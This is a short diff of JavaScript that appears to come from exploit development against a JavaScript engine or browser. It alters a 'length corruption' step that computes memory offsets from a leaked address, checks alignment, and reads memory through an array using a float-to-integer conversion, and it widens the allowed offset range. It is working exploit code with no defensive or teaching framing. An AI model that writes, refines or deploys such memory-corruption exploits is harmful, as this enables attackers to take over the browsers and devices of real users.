@@ -100,7 +100,7 @@ try{
   // ES length corruption — proven p46 approach with BigInt
   const tq=(esAddrBI-1n)+8n;
   const off2b=tq-0x1080018n;
-  if(off2b>0n&&off2b<0x400000n){
+  if(off2b>0n&&off2b<0x2000000n){
     if((off2b&7n)===0n){
       const idx=Number(off2b>>3n);
       const v=f2i(m[idx]);
